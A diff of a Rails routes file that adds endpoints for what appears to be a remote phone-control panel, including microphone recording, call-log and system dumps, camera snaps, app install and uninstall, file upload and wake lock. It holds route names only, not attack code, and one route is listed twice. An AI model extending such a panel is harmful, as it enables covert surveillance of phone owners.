@@ -17,7 +17,11 @@ end
         post :dump_calllogs
     end
 end
-  resources :recordings
+  resources :recordings do
+    collection do
+      post :microphone_rec
+  end
+end
   resources :videos
   resources :screenshots
   resources :pictures do
@@ -29,11 +33,24 @@ end
   resources :smartphones do
     collection do
         get :load
+        get :check_connection
         post :install 
         post :front_camera_snap
         post :select_smartphone
         post :take_picture
-        post :system_info
+        post :dump_sysinfo
+        post :set_audio_mode
+        post :dump_localtime
+        post :uninstall_app
+        post :install_app
+        post :uninstall_app
+        post :list_apps
+        post :open_app
+        post :upload_file
+        post :wake_lock
+
+
+
     end
   end
   
